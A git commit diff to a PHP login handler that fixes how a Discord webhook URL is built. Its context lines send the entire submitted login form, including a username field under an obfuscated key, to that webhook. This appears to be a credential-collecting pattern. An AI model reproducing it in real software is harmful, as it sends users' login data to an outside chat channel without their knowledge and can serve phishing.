45b15091baa057cbae439241ccaae8b23fac99ce
Yuu Komiya <8064928+n138-kz@users.noreply.github.com>
2026-08-08 11:00:29 +0900

    Update login.php

--- docs/login.php
+++ docs/login.php
@@ -56,7 +56,7 @@ $input = json_decode(file_get_contents('php://input'), true);
     $input['formdata']['g-recaptcha-response']['issued_at'] = $input['formdata']['g-recaptcha-response']['issued_at'] ?? null;
 }
 {
-    $url = "$config['discord']['webhook_url']?wait=true";
+    $url = $config['discord']['webhook_url'] . '?wait=true';
     $content = "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```";
     $embed = [
         'title' => 'ユーザー名: ' . ($input['formdata']['dlym6tweiywa2taq']['value'] ?? null),
